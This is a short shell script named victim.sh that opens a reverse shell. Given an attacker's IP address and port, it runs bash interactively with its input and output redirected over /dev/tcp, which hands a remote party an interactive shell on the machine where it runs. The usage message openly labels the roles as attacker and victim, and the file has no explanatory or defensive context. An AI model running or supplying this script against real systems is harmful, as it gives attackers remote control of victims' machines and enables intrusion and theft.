#!/bin/sh

ARGCNUM=2
if [ $# == $ARGCNUM ];then
	bash -i >& /dev/tcp/$1/$2 0>&1
else
	echo "usuage: ./victim.sh [ip_of_attacker] [attacker's_binded_port]"
fi;
